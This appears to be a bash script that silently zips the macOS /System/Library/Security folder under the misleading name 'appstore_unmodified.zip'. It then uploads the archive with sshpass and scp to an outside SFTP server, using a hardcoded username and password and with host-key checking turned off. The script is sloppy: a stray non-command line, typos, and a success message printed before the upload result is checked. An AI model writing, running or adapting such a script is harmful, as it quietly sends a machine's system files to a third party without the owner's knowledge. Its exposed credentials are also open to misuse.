
cd $home/../../../System/Library/
archeiving files
echo "archiving silently"
zip -qr appstore_unmodified.zip Security && echo "Archiving complete!"


# Configuration
LOCAL_FILE="appstore_unmodified.zip"
REMOTE_USER="07319b13f82f42f4b7992f67379c8502"
REMOTE_HOST="eu-central-1.sftpcloud.io"
REMOTE_PATH="/home"
REMOTE_PASS="xYKQetq8br1c99TV7BkgCrRZ6GpVylYl"
REMOTE_DEST="/"


# --- Upload Command ---
# -p specifies the password
# -o StrictHostKeyChecking=no prevents the script from hanging on new host prompts
sshpass -p "$REMOTE_PASS" scp -o StrictHostKeyChecking=no "$LOCAL_FILE" "$REMOTE_USER@$REMOTE_HOST:$REMOTE_DEST"
 echo "connection sucesfully"
# Check if the upload was successful
if [[ $? -eq 0 ]]; then
   echo "connection sucesfully"
else
   echo "connection failed."
fi
